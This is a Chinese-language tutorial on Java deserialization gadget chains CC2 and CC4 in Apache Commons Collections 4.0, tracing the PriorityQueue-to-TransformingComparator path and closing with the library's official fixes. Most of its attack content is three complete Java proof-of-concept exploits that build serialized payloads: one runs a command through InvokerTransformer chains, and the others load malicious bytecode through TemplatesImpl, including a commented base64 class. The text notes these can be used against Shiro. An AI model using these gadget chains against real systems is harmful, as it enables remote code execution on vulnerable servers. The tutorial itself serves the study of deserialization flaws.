# 反序列化基础篇-Commons-Collections4.0 下的 CC2 和 CC4
# 0x00 前置知识
## 0.1 Commons-Collections4 的出现
Apache Commons Collections 是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，`Commons Collections` 被广泛应用于各种Java应用的开发。

官⽅认为旧的 `commons-collections` 有⼀些架构和API设计上的问题，但修复这些问题，会产⽣⼤量不能向前兼容的改动。

所以 `Apache Commons Collections` 有 3.x 和 4.x 两个分⽀版本，而且 `groupId` 和 `artifactId` 都变了：

- commons-collections:commons-collections 
- org.apache.commons:commons-collections4

`commons-collections4` 不再认为是⼀个⽤来替换 `commons-collections` 的新版本，⽽是⼀个新的包，两者的命名空间不冲突，故可以共存在同⼀个项⽬中。

<div align=center><img width="772" alt="image" src="https://github.com/reidmu/sec-note/assets/84888757/28456b67-ee05-4bfd-9bdc-24a824bf48f5" /></div>

我们前面分析的CC链默认都是在 `Commons Collections<=3.2.1` 这个分支下的，而这篇文章要讲到的 `CC2` 和 `CC4` 这两条利用链都是在 `Commons Collections=4.0` 才有的。

## 0.2 commons-collections4 的改动
1、方法名的改动：
- `org.apache.commons.collections.*` 变为 `org.apache.commons.collections4.*`
- `LazyMap.decorate()` 变为 `LazyMap.lazyMap()`
- `TransformedMap.decorate()` 变为 `TransformedMap.transformedMap()`

2、`Transformer` 接口及其实现类的定义变化

`Transformer` 接口的定义采用了泛型，实现了该接口的类也发生了变化，比如LazyMap等实现类代码也采用了泛型：

<div align=center><img width="861" alt="image" src="https://github.com/reidmu/sec-note/assets/84888757/499f7147-802c-4b37-87dd-a74d1277f7ec" /></div>


<br>3、在 `commons-collections4` 中增加了一些能调用到 `Transformer#transform()` 的方法：

<div align=center><img width="586" alt="image" src="https://github.com/reidmu/sec-note/assets/84888757/fa76850c-f68d-4898-8c68-5345ebbb8f08" /></div>

<div align=center><img width="514" alt="image" src="https://github.com/reidmu/sec-note/assets/84888757/a9e93596-8347-4e2c-8fff-58422b57118b" /></div>

<br>4、有的类实现了 `Serializable` 接⼝

`CC2`、`CC4` 利⽤链中的关键类 `org.apache.commons.collections4.comparators.TransformingComparator` ，在 `commonscollections4.0` 以前的版本中是没有实现 `Serializable` 接⼝的，⽆法在序列化中使⽤。

所以 `CC2` 和 `CC4` 不⽀持在 `commons-collections 3` 中使⽤。

## 0.3 commons-collections4 中的利用链

放张白日梦组长的图便于识别 `CC2` 和 `CC4` 利用链的区别：

<img width="1104" alt="image" src="https://github.com/reidmu/sec-note/assets/84888757/43ba6512-4522-4d83-956b-a840b86c260d">


# 0x01 环境搭建
## 1.1 maven项目导入依赖

pom.xml导入依赖

```xml
    <!-- https://mvnrepository.com/artifact/org.apache.commons/commons-collections4 -->
    <dependency>
      <groupId>org.apache.commons</groupId>
      <artifactId>commons-collections4</artifactId>
      <version>4.0</version>
    </dependency>
```
## 1.2 JDK版本及sun包源码

`CC` 链需要用到 `sun` 包中的类，而 `sun` 包在 `jdk` 中的代码是通过 `class` 文件反编译来的，不是 `java` 文件，调试不方便，通过 `find usages` 是搜不到要找的类的，而且其代码中的对象是 `var` 这样的形式，影响代码的阅读。

下载`sun`包，把 `src/share/classes`中的 `sun` 文件夹 放到 `oracle jdk8u66`的`src`文件夹下。
https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4

<div align=center><img width="641" alt="image" src="https://user-images.githubusercontent.com/84888757/204700877-5c68fc27-ba97-4dab-a0cd-01a70d91bdeb.png" /></div>

将`sun`包复制到对应`jdk`的`src`目录下（Macbook时在/Library/Java/JavaVirtualMachines/jdk1.8.0_66.jdk/Contents/Home/Src下）

<img width="1155" alt="image" src="https://user-images.githubusercontent.com/84888757/204702741-0e8acfc6-52ec-4f28-965b-08e3178d7426.png">

然后在 IDEA 中，`File --> Project Structure --> SDKs` 将 `src` 目录的路径加到 `Sourcepath` 中去：  

<div align=center><img width="894" alt="image" src="https://user-images.githubusercontent.com/84888757/204702840-522354dc-6fc8-4e28-b106-56b240d0908f.png" /></div>

下载maven源码包：

<div align=center><img width="445" alt="image" src="https://user-images.githubusercontent.com/84888757/204703339-9e7d9b3c-e354-489d-8ff2-e5992f3ddc8f.png" /></div>

## 1.3 添加 javassist.jar
编写 CC2 POC 时用到了 `javassist` ，这是一个字节码操纵的第三方库，可以帮助我将恶意类 `com.vulhub.evil.EvilTemplatesImpl` 生成字节码再交给 `TemplatesImpl` 。

下载地址：https://github.com/jboss-javassist/javassist/releases

然后在 IDEA 中，`File --> Project Structure --> SDKs` 将 `javassist.jar` 目录的路径加到 `ClassPath` 中去：  

<img width="1024" alt="image" src="https://user-images.githubusercontent.com/84888757/205999622-bba8cd8d-e8f5-4b33-b247-494fbaa941a5.png">

# 0x03 PriorityQueue利⽤链
## 3.0 思路
除了⽼的⼏个利⽤链，ysoserial 还为 `commons-collections4` 准备了两条新的利⽤链，那就是 `CommonsCollections2` 和 `CommonsCollections4`。 

`commons-collections` 这个包能攒出那么多利⽤链来，主要是因为其中包含了⼀些可以执⾏任意⽅法的 `Transformer`。

所以，在 `commons-collections` 中找 `Gadget` 的过程，实际上可以简化为，找⼀条从 `Serializable#readObject()` ⽅法到 `Transformer#transform()` ⽅法的调⽤链。

## 3.1 CommonsCollections2

**条件：**

- commons-collections4: 4.0
- jdk1.7 1.8低版本

有了上面的思路，我们再来看一下 `CommonsCollections2` 的两个关键类：
- java.util.PriorityQueue
- org.apache.commons.collections4.comparators.TransformingComparator

这两个类很符合在 `3.0 思路` 小节中提到的找 `Gadget` 的过程中所需要的类的特性。

`java.util.PriorityQueue` 是⼀个有⾃⼰ `readObject()` ⽅法的类：

![image](https://github.com/reidmu/sec-note/assets/84888757/5f517d7f-5f36-40ec-b40e-099d94c9a0ec)

`org.apache.commons.collections4.comparators.TransformingComparator` 中有调⽤ `Transformer#transform()` ⽅法的函数 `compare` ：

![image](https://github.com/reidmu/sec-note/assets/84888757/69f28ffb-2fad-4a59-93d3-d2e96cdfbec9)

`TransformingComparator` 类可序列化，实现了 `java.util.Comparator` 接⼝，这个接⼝⽤于定义两个对象如何进⾏⽐较。

`TransformingComparator` 包含了一个 `Transformer` 和一个 `Comparator` ，在其 `compare` 方法中先使用 `Transformer#transform()` 对两个要比较的对象进行修饰，然后再调用 `Comparator#compare` 进行比较。

所以，`CommonsCollections2` 实际就是⼀条从 `PriorityQueue` 到 `TransformingComparator` 的利⽤链。

利用链如下：

```java
ObjectInputSream#readObject()
  --> PriorityQueue#readObject()
    --> PriorityQueue#heapify()
      --> PriorityQueue#siftDown()
        --> PriorityQueue#siftDownUsingComparator
          --> comparator.compare()    //当这个 comparator 是 TransformingComparator 时，就是 TransformingComparator#compare()
            --> InvokerTransformer#transform()
              --> Method.invoke()
                --> Runtime.exec()

```

![image](https://github.com/reidmu/sec-note/assets/84888757/f4269105-ae65-4d88-9492-13aa981813dc)

总结⼀下： 

- `java.util.PriorityQueue` 是⼀个优先队列（Queue），基于⼆叉堆实现，队列中每⼀个元素有⾃⼰的优先级，节点之间按照优先级⼤⼩排序成⼀棵树。
- `PriorityQueue` 在反序列化时需要调⽤ `heapify()` ⽅法来恢复（换⾔之，保证）这个结构的顺序。
- `heapify()` 中调用 `siftDown()` ，在 `siftDown()` 中当用户指定了 `Comparator`，就会调用 `siftDownUsingComparator()` 进行排序，它将⼤的元素下移。 
- `siftDownUsingComparator()` 中使⽤ `Comparator().compare()` ⽅法⽐较树的两个节点，当传入的 `Comparator` 为 `TransformingComparator` 时，可以触发 `Transformer#transform()` 造成命令执行。

关于 `PriorityQueue` 这个数据结构的具体原理，可以参考这篇⽂章：https://www.cnblogs.com/linghu-java/p/9467805.html 

### 3.1.1 PriorityQueueChain POC
现在开始尝试写POC，这里需要说明一点，在向其中添加元素时，也是会调用 `Comparator().compare()` 进行元素比较的：
```
PriorityQueue#add -> PriorityQueue#offer -> PriorityQueue#siftUp -> PriorityQueue#siftUpUsingComparator -> comparator.compare()
```

所以和分析 `CC6` 时一样，我们得先传一个人畜无害的 `fakeformers` 数组，不过我们在添加之后不需要移除什么，因为这里只是进行元素大小比较，不会像 `LazyMap#get()` 在反序列化利用时需要 `map` 中无 `key` 。

📒 CC2_1.java

```java
package org.vulhub.Ser;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CC2_1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {

        // 创建 无害的 Transformer
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};

        // 创建 执行命令的 Transformer
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[] {"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
                new ConstantTransformer(1),
        };
        // 先传入 无害的 Transformer，避免调试时触发命令
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        // 创建 TransformingComparator，传入 transformerChain
        Comparator comparator = new TransformingComparator(transformerChain);

        // 创建一个队列 queue，使用 TransformingComparator 作为比较器
        // 第⼀个参数是初始化时的⼤⼩，⾄少需要2个元素才会触发排序和⽐较， 所以是2；第⼆个参数是⽐较时的 Comparator，传⼊前⾯实例化的 comparator
        PriorityQueue queue = new PriorityQueue(2, comparator);

        //随便添加了2个数字进去，这⾥可以传⼊⾮ null 的任意对象，因为我们的 Transformer 是忽略传⼊参数的。
        queue.add(1);
        queue.add(2);

        // 将真正的恶意Transformer设置上
        setFieldValue(transformerChain, "iTransformers", transformers);

////        // ==================
//        // 生成序列化字符串
//        ByteArrayOutputStream barr = new ByteArrayOutputStream();
//        ObjectOutputStream oos = new ObjectOutputStream(barr);
//        oos.writeObject(queue);
//        oos.close();
//
//        // 本地测试触发反序列化
//        System.out.println(barr);
//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
////        ois.readObject();
//        Object o = (Object) ois.readObject();

        // 序列化, 保存为文件
//        serialize(queue);
        // 反序列化，从文件中读取上面一步序列化的数据
        unserialize("ser_CC2_1.bin");

    }

    public static void serialize(Object queue) throws IOException {
        FileOutputStream fileOutputStream = new FileOutputStream("./ser_CC2_1.bin");
        ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);
        outputStream.writeObject(queue);
        outputStream.close();
        fileOutputStream.close();
    }

    public static void unserialize(String args) throws IOException, ClassNotFoundException {
        FileInputStream fileInputStream = new FileInputStream(args);
        ObjectInputStream ois = new ObjectInputStream(fileInputStream);

        ois.readObject();
    }
}
```

<img width="1336" alt="image" src="https://github.com/reidmu/sec-note/assets/84888757/b3e25807-dfa5-4761-8503-a82c124a8d0f">

### 3.1.1 CC2 POC
Ysoserial中的 `CC2` 最终是用的 `TemplatesImpl` 来执行命令的，且数组长度为1，所以 `Ysoserial` 原生的 `CC2` 可以直接用来攻击 `shiro` 。

📒 CC2_yso_TemplatesImpl

```java
package org.vulhub.Ser;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;


public class CC2_yso_TemplatesImpl {

    public static void main(String[] args) throws Exception {

        // 创建 TemplatesImpl 对象
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{getBytescode()});
        setFieldValue(templates, "_name", "HelloTemplatesImpl");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        // 创建⼀个⼈畜⽆害的 InvokerTransformer 对象，并先⽤它实例化 Comparator, 避免 queue.add 的时候触发命令
        // 这里用 toString ，不能用 getClass，因为会导致在 compare 时两个比较的对象均为Class类型，Class类型是无法进行比较的
        Transformer transformer = new InvokerTransformer("toString", null, null);
        Comparator comparator = new TransformingComparator(transformer);

        // 实例化 PriorityQueue ，但是此时向队列⾥添加的元素就是我们前⾯创建的 TemplatesImpl 对象了：
        // 为了使 CC2 可以直接用来攻击 shiro，这⾥⽆法再使⽤ Transformer 数组，所以也就不能⽤ ConstantTransformer 来初始化变量，需要接受外部传⼊的变量。
        // ⽽在 Comparator#compare() 时，队列⾥的元素将作为参数传⼊ transform() ⽅法，这就是传给 TemplatesImpl#newTransformer 的参数。
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(templates);
        queue.add(templates);

        // 最后⼀步，将 toString ⽅法改成恶意⽅法 newTransformer
        setFieldValue(transformer, "iMethodName", "newTransformer");

        // 序列化, 保存为文件
//        serialize(queue);
        // 反序列化，从文件中读取上面一步序列化的数据
        unserialize("ser_CC2_yso_TemplatesImpl.bin");

    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    protected static byte[] getBytescode() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(evil.EvilTemplatesImpl.class.getName());
        return clazz.toBytecode();
    }

    public static void serialize(Object queue) throws IOException {
        FileOutputStream fileOutputStream = new FileOutputStream("./ser_CC2_yso_TemplatesImpl.bin");
        ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);
        outputStream.writeObject(queue);
        outputStream.close();
        fileOutputStream.close();
    }

    public static void unserialize(String args) throws IOException, ClassNotFoundException {
        FileInputStream fileInputStream = new FileInputStream(args);
        ObjectInputStream ois = new ObjectInputStream(fileInputStream);

        ois.readObject();
    }
}
```

## 3.2 无数组的 CommonsCollections4

**条件：**

- commons-collections4: 4.0
- jdk7u21之前

`CC4` 可以看成是对 `CC2` 的改造，用 `InstantiateTransformer` 来替代 `InvokerTransformer` ，在学习 `CC3` 的时候，我们学习过 [InstantiateTransformer](https://github.com/reidmu/sec-note/blob/main/Java-sec/CC3.md#35-instantiatetransformer) 了。

> <img width="1007" alt="image" src="https://github.com/reidmu/sec-note/assets/84888757/ae9e41d1-58f2-485c-a4f3-9ac96d6b48ce">

Ysoserial源码数组长度为 2 ，这里为了可以用来攻击 `shiro` ，将数组长度变为 1 。

```java
package org.vulhub.Ser;

import java.util.Base64;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CC4_1 {

    public static void main(String[] args) throws Exception {
//        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAKQoACQAYCgAZABoIABsKABkAHAcAHQcAHgoABgAfBwAgBwAhAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHACIBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAGPGluaXQ+AQADKClWAQANU3RhY2tNYXBUYWJsZQcAIAcAHQEAClNvdXJjZUZpbGUBAApDYWxjMS5qYXZhDAARABIHACMMACQAJQEABGNhbGMMACYAJwEAE2phdmEvbGFuZy9FeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwAEQAoAQAFQ2FsYzEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAAAwABAAoACwACAAwAAAAZAAAAAwAAAAGxAAAAAQANAAAABgABAAAACAAOAAAABAABAA8AAQAKABAAAgAMAAAAGQAAAAQAAAABsQAAAAEADQAAAAYAAQAAAAoADgAAAAQAAQAPAAEAEQASAAEADAAAAGUAAwACAAAAGyq3AAG4AAISA7YABFenAA1MuwAGWSu3AAe/sQABAAQADQAQAAUAAgANAAAAGgAGAAAADAAEAA4ADQARABAADwARABAAGgASABMAAAAQAAL/ABAAAQcAFAABBwAVCQABABYAAAACABc=");

        // 创建 TemplatesImpl 对象
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "xxx");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
//        setFieldValue(templates, "_bytecodes", new byte[][]{code});
        setFieldValue(templates, "_bytecodes", new byte[][]{getBytescode()});

        ConstantTransformer fakeformer = new ConstantTransformer(1);

        InstantiateTransformer transformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});

        Comparator comparator = new TransformingComparator(fakeformer);

        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(TrAXFilter.class);
        queue.add(TrAXFilter.class);


        // 最后⼀步，将 toString ⽅法改成恶意⽅法 newTransforme
        setFieldValue(comparator,"transformer",transformer);

        // 序列化, 保存为文件
//        serialize(queue);
        // 反序列化，从文件中读取上面一步序列化的数据
        unserialize("ser_CC4_TrAXFilter_TemplatesImpl.bin");

    }
    protected static byte[] getBytescode() throws Exception {
        // 使用javassist操作字节码
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(evil.EvilTemplatesImpl.class.getName());
        return clazz.toBytecode();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void serialize(Object queue) throws IOException {
        FileOutputStream fileOutputStream = new FileOutputStream("./ser_CC4_TrAXFilter_TemplatesImpl.bin");
        ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);
        outputStream.writeObject(queue);
        outputStream.close();
        fileOutputStream.close();
    }

    public static void unserialize(String args) throws IOException, ClassNotFoundException {
        FileInputStream fileInputStream = new FileInputStream(args);
        ObjectInputStream ois = new ObjectInputStream(fileInputStream);

        ois.readObject();
    }
}
```

<img width="1251" alt="image" src="https://github.com/reidmu/sec-note/assets/84888757/8fedca69-f363-4742-b274-caaf55d66ad4">

# 0x04 Apache Commons Collections官⽅对反序列化漏洞的修复
Apache Commons Collections官⽅在2015年底得知序列化相关的问题后，就在两个分⽀上同时发布了新的版本—4.1和3.2.2，采用的是不同的修复方法：

## commons-collections 3.2.2 中的修复
`commons-collections 3.2.2` 中增加了⼀个⽅法 `FunctorUtils#checkUnsafeSerialization()` 来检测反序列化是否安全：

https://github.com/apache/commons-collections/blob/collections-3.2.2/src/java/org/apache/commons/collections/functors/FunctorUtils.java#L168

检查常⻅的危险 `Transformer` 类 （ `InstantiateTransformer` 、`InvokerTransformer` 、`PrototypeFactory` 、`CloneTransformer` 等）是否在 `readObject()` 时进⾏调⽤。

如果开发者没有设置全局配置 `org.apache.commons.collections.enableUnsafeSerialization=true` ，即默认情况下，当我们反序列化包含这些对象时就会抛出⼀个异常：
> Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons. To enable it set system property 'org.apache.commons.collections.enableUnsafeSerialization' to 'true', but you must ensure that your application does not de-serialize objects from untrusted sources.

## commons-collections 4.1 中的修复
`commons-collections 4.1` 版本中的修复方法简单粗暴，危险 `Transformer` 类（`InstantiateTransformer` 、`InvokerTransformer` 、`PrototypeFactory` 、`CloneTransformer` 等）不再实现 `Serializable` 接⼝，也就是说，危险 `Transformer` 类彻底⽆法序列化和反序列化了：

https://github.com/apache/commons-collections/tree/collections-4.1/src/main/java/org/apache/commons/collections4/functors


# 0x05 参考链接
- https://mp.weixin.qq.com/s/WeOPcpCo2ucWoF42OeUbpA
- [白日梦组长](https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=333.788&vd_source=d97edb6eb916442af659cdbbc179091c)
- [Java安全漫谈 - 16.commons-collections4与漏洞修复](https://t.zsxq.com/ZBQj2FE)







